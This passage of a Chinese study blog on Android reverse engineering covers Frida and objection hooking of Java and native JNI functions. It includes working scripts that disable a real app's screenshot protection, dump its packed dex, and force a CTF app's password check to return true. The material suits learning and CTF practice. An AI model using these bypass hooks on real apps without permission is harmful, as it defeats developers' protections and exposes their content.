Complete&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(getTotalValue)</span><br></pre></td></tr></table></div></figure>

<p>那么即可获取到变量值了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925160640781.png" alt="image-20230925160640781"></p>
<p>下面尝试<code>RPC</code>自动化，在上述<code>js</code>代码中加入<code>CallSecrectFunc</code>来调用<code>secrect</code>函数，如下代码。再加上<code>rpc</code>导出代码，方便后续<code>python</code>复用</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CallSecretFunc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态函数主动调用</span></span><br><span class="line">        Java.choose(<span class="string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">               </span><br><span class="line">                instance.secret()</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    <span class="attr">callsecretfunc</span> : CallSecretFunc,</span><br><span class="line">    <span class="attr">gettotalvalue</span> : getTotalValue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后再运行导出即可</p>

        <h3 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h3>
      <ul>
<li><p>查看运行的包：<code>frida-ps -U</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925111121983.png" alt="image-20230925111121983"></p>
</li>
<li><p>当函数被重载之后，使用<code>Frida</code>进行注入则需要指定参数类型，如下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MainAcitivity.fun.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li></li>
</ul>

        <h2 id="Objection逆向"   >
          <a href="#Objection逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#Objection逆向" class="headerlink" title="Objection逆向"></a>Objection逆向</h2>
      
        <h2 id="Cha05破解弹窗"   >
          <a href="#Cha05破解弹窗" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cha05破解弹窗" class="headerlink" title="Cha05破解弹窗"></a>Cha05破解弹窗</h2>
      <p><code>Android</code>中常用</p>

        <h2 id="Native层HOOK"   >
          <a href="#Native层HOOK" class="heading-link"><i class="fas fa-link"></i></a><a href="#Native层HOOK" class="headerlink" title="Native层HOOK"></a>Native层HOOK</h2>
      
        <h3 id="NDK开发-1"   >
          <a href="#NDK开发-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#NDK开发-1" class="headerlink" title="NDK开发"></a>NDK开发</h3>
      <p>新建<code>Android studio</code>项目，选择<code>Native C++</code>项目，响应的<code>MainActivity</code>代码如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ndkpro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ndkpro.databinding.ActivityMainBinding;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the &#x27;ndkpro&#x27; library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;ndkpro&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        binding = ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        setContentView(binding.getRoot());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Example of a call to a native method</span></span><br><span class="line">        TextView tv = binding.sampleText;</span><br><span class="line">        tv.setText(stringFromJNI());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the &#x27;ndkpro&#x27; native library,</span></span><br><span class="line"><span class="comment">     * which is packaged with this application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>下面进行一些简单的解析：</p>
<ul>
<li><p><code>System.loadLibrary(&quot;ndkpro&quot;)</code>：代表将这个动态库加载到内存中</p>
</li>
<li><p><code>public native String stringFromJNI()</code>：这个函数实际上是一个<code>JNI</code>函数，真实的函数内容是通过<code>C/C++</code>进行实现的，点击<code>C/C++</code>图标可以跳转查看真实代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926112422331.png" alt="image-20230926112422331"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">JNIEXPORT jstring</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_ndkpro_MainActivity_stringFromJNI</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv *env,</span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> hello = <span class="string">&quot;Hello from C++&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到是有<code>C/C++</code>进行实现，并且其命名规则为<code>Java_PackageName_ClassName_MethodName</code>，对应分析一下即可。</p>
<p>多出的两个参数<code>JNIEnv *env</code>和<code>jobject</code>分别表示当前<code>java</code>线程的执行环境和响应函数所在类的对象。</p>
</li>
<li><p>此外还有一些对应的数据类型</p>
<div class="table-container"><table>
<thead>
<tr>
<th>Java数据类型</th>
<th>JNI数据类型</th>
</tr>
</thead>
<tbody><tr>
<td>boolean</td>
<td>jboolean</td>
</tr>
<tr>
<td>byte</td>
<td>jbyte</td>
</tr>
<tr>
<td>void</td>
<td>void</td>
</tr>
<tr>
<td>….</td>
<td></td>
</tr>
<tr>
<td>class</td>
<td>jclass</td>
</tr>
</tbody></table></div>
<p>除了<code>void</code>，大多都是在前面加<code>j</code>。</p>
</li>
</ul>
<p>直接使用这个例子编译为<code>APK</code>，解压打开<code>APK</code>会发现多一个<code>lib</code>目录，下面存放四种架构的<code>.so</code>文件，在对应的平台调用不同架构的<code>.so</code>文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926113457997.png" alt="image-20230926113457997"></p>
<p>安装<code>APK</code>之后，用<code>objection</code>注入进程，使用命令<code>memory list modules</code>即可查看对应的<code>.so</code>文件是否注入到内存了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926113754950.png" alt="image-20230926113754950"></p>
<p>之后可以使用命令<code>memory list export libndkpro.so </code>导出相关的符号</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926114035756.png" alt="image-20230926114035756"></p>
<p>其他的函数变量都会加上一些乱七八糟的字符，这是因为<code>C++</code>的<code>name mangling</code>名称粉碎机制，如果不需要这个，则需要加上<code>extern &quot;C&quot;</code>，而<code>JNI</code>函数就是因为加入这个标识就不会有名称粉碎机制导致函数名变化。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926114143365.png" alt="image-20230926114143365"></p>
<p>可以使用<code>C++filt</code>对函数名还原</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230926114600807.png" alt="image-20230926114600807"></p>

        <h3 id="开始HOOK"   >
          <a href="#开始HOOK" class="heading-link"><i class="fas fa-link"></i></a><a href="#开始HOOK" class="headerlink" title="开始HOOK"></a>开始HOOK</h3>
      
        <h4 id="静态注册JNI函数"   >
          <a href="#静态注册JNI函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#静态注册JNI函数" class="headerlink" title="静态注册JNI函数"></a>静态注册JNI函数</h4>
      <p>上述提到的都是静态注册的<code>JNI</code>函数，有一定的命名方式</p>
<p>修改一下例子，使之循环调用需要<code>Hook</code>的函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ndkpro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> com.example.ndkpro.databinding.ActivityMainBinding;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the &#x27;ndkpro&#x27; library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;ndkpro&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Example of a call to a native method</span></span><br><span class="line">        TextView tv = findViewById(R.id.sample_text);</span><br><span class="line">        tv.setText(sI3());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Log.i(<span class="string">&quot;r0so2&quot;</span>, stringFromJNI());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the &#x27;ndkpro&#x27; native library,</span></span><br><span class="line"><span class="comment">     * which is packaged with this application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>针对上述例子中的<code>libndkpro.so</code>，使用如下代码进行<code>HOOK</code></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_native</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> addr = Module.getExportByName(<span class="string">&quot;libndkpro.so&quot;</span>, <span class="string">&quot;Java_com_example_ndkpro_MainActivity_stringFromJNI&quot;</span>);</span><br><span class="line">    Interceptor.attach(addr,&#123;   </span><br><span class="line">        <span class="attr">onEnter</span>:<span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;jnienv pointer =&gt;&quot;</span>,args[<span class="number">0</span>])</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;jobj pointer =&gt;&quot;</span>,args[<span class="number">1</span>])</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;retval is =&gt;&quot;</span>,Java.vm.getEnv().getStringUtfChars(retval, <span class="literal">null</span>).readCString())</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;=================&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hook_native)</span><br></pre></td></tr></table></div></figure>

<p>正常使用<code>frida</code>进行<code>hook</code>即可。</p>

        <h4 id="动态注册JNI函数"   >
          <a href="#动态注册JNI函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态注册JNI函数" class="headerlink" title="动态注册JNI函数"></a>动态注册JNI函数</h4>
      <p>修改一下模式即可，在<code>native-lib.cpp</code>中更改如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jstring JNICALL <span class="title">sI3</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,</span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/*this*/</span>)</span> </span>&#123;</span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++ stringFromJNI3 r0ysue &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JNIEnv * env;</span><br><span class="line">    vm-&gt;GetEnv((<span class="keyword">void</span>**)&amp;env,JNI_VERSION_1_6);</span><br><span class="line">    JNINativeMethod methods[] = &#123;</span><br><span class="line">            &#123;<span class="string">&quot;stringFromJNI3&quot;</span>,<span class="string">&quot;()Ljava/lang/String;&quot;</span>,(<span class="keyword">void</span>*)sI3&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    env-&gt;RegisterNatives(env-&gt;FindClass(<span class="string">&quot;com/example/ndkpro/MainActivity&quot;</span>),methods,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里即代表对<code>stringFromJNI3</code>的函数调用注册为对<code>sI3</code>的函数调用，在对应的<code>Mainactivity</code>中还是不变，修改成调用<code>stringFromJNI3</code>即可。重新编译运行<code>APP</code>即可看到对应的<code>adb logcat</code>日志</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230927153610314.png" alt="image-20230927153610314"></p>
<p>使用这种方式注册的<code>JNI</code>函数的<code>ndkpro.so</code>会找不到<code>stringFromJNI3()</code>字符串相关的函数，这种情况就需要通过先寻找模块基地址，然后寻找偏移地址来获取。</p>
<p>mark：书里面提供的脚本用不了</p>

        <h2 id="移动安全升级"   >
          <a href="#移动安全升级" class="heading-link"><i class="fas fa-link"></i></a><a href="#移动安全升级" class="headerlink" title="移动安全升级"></a>移动安全升级</h2>
      
        <h3 id="第一课、截屏，加壳"   >
          <a href="#第一课、截屏，加壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一课、截屏，加壳" class="headerlink" title="第一课、截屏，加壳"></a>第一课、截屏，加壳</h3>
      <p>破解<code>mmzztt</code>的截屏，首先打开<code>mmzztt</code>，然后用<code>adb</code>即可查看当前<code>apk</code>的一些包信息<code>adb shell dumpsys window | grep mCurrentFocus</code>，注意这里搜索到的<code>com.mmzztt.app</code>是包的名称，用来使用<code>spawn</code>模式重新启动进程，但是实际上启动之后的进程可能并不叫这个名称，可能是其他名称，如果使用<code>attach</code>模式的话，则需要进程名称才行的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007104116697.png" alt="image-20231007104116697"></p>
<p>随后需要了解一下截屏机制的相关知识，搜索一下实现<code>Android</code>实现截屏的代码，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pythonjishu.com/yixacszzix/" >android应用内代码截屏(获取view快照)和禁止截屏 - Python技术站 (pythonjishu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>比较关键的就是如下一段代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007140745804.png" alt="image-20231007140745804"></p>
<p>那么就可以搜索一下这个<code>setFlasg</code>的<code>API</code>是否存在调用，直接搜索函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search methods setFlags</span><br></pre></td></tr></table></div></figure>

<p>会出现一些结果，但是都不是<code>window</code>相关的函数调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007140600567.png" alt="image-20231007140600567"></p>
<p>因为提到的<code>Android</code>防截屏知识是获取<code>window</code>对象，然后调用<code>setFlags</code>，那么这里就需要<code>window</code>对象，那么搜索一下<code>window</code>类对象</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes window</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007140952899.png" alt="image-20231007140952899"></p>
<p>会找到一些，但是具体是那个得判断仔细判断一下，这里师傅说盲猜是<code>android.view.Window</code>，那么就搜索一下这个类中的方法是否存在<code>setFlags</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list class_methods android.view.Window</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007141516805.png" alt="image-20231007141516805"></p>
<p>存在该方法调用，那么就可以<code>hook</code>这个方法，使其不发生作用即可，这里直接用<code>objection</code>好像不太好使，接下来转换为<code>r0tracer</code>进行寻找</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/r0ysue/r0tracer" >r0ysue/r0tracer: 安卓Java层多功能追踪脚本 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>需要修改一下里面的代码，改为指定函数类即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007142540131.png" alt="image-20231007142540131"></p>
<p>然后如下代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.mmzztt.app -l r0tracer.js -o mzt.logs</span><br></pre></td></tr></table></div></figure>

<p><code>-f</code>为<code>spawn</code>模式，因为可能在程序运行之后，这个函数已经被调用了，后续不会被调用，那么就需要用这个模式来重启运行，最终在日志中找到如下调用链</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007143001688.png" alt="image-20231007143001688"></p>
<p>依据这个来<code>hook</code>或者其他方式即可，使用如下代码进行<code>hook</code>并打印相关信息</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;android.view.Window&quot;</span>).setFlags.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;setFlags called&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Java.use(&quot;android.view.Window&quot;).addFlags.implementation = function(x,y)&#123;</span></span><br><span class="line">        <span class="comment">//     console.log(&quot;addFlags called&quot;)</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></div></figure>

<p>这样<code>frida -U -f com.mmzztt.app -l ./mmzztt.js</code>使用<code>spawn</code>模式启动之后，这样就能截屏了，完成破解</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007145600476.png" alt="image-20231007145600476"></p>
<p>之后使用<code>jadx</code>分析会发现加壳了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007143201603.png" alt="image-20231007143201603"></p>
<p>那么使用<code>frida</code>一些项目工具进行动态下载<code>dex</code>文件解析，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/hluwa/frida-dexdump" >hluwa/frida-dexdump: A frida tool to dump dex in memory to support security engineers analyzing malware. (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后在手机上打开对应的应用，在<code>kali</code>中输入<code>frida-dexdump -UF</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007151049150.png" alt="image-20231007151049150"></p>
<p>然后搜索一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007151303850.png" alt="image-20231007151303850"></p>
<p>然后用<code>jadx</code>打开，通常会失败，显示如下，这是一个<code>jadx</code>的功能，关掉就行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007151426203.png" alt="image-20231007151426203"></p>
<p>修改一下参数，点击<code>File-&gt;Preferences</code>，修改为<code>no</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007151552568.png" alt="image-20231007151552568"></p>
<p><code>F5</code>重新加载一下即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007151659442.png" alt="image-20231007151659442"></p>

        <h3 id="第二课、攻防世界基础android"   >
          <a href="#第二课、攻防世界基础android" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二课、攻防世界基础android" class="headerlink" title="第二课、攻防世界基础android"></a>第二课、攻防世界基础android</h3>
      <p><code>hook</code>逆向基础，拉起<code>activity</code>，广播</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list" >攻防世界 (xctf.org.cn)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>下载<code>APK</code>安装，发现需要输入密码，逆向分析找到<code>Mainactivity</code>，找到<code>button</code>执行逻辑，其实就是调用<code>check.checkPassword</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007160215264.png" alt="image-20231007160215264"></p>
<p>查看一下代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007161409585.png" alt="image-20231007161409585"></p>
<p>那么<code>hook</code>一下返回<code>true</code>即可</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;com.example.test.ctf02.Check&quot;</span>).checkPassword.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;check called&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> ret_value = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></div></figure>

<p>使用如下命令<code>frida -U -f com.example.test.ctf02 -l ./test.js</code></p>
<p>然后进入下一关，需要输入然后显示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007161609398.png" alt="image-20231007161609398"></p>
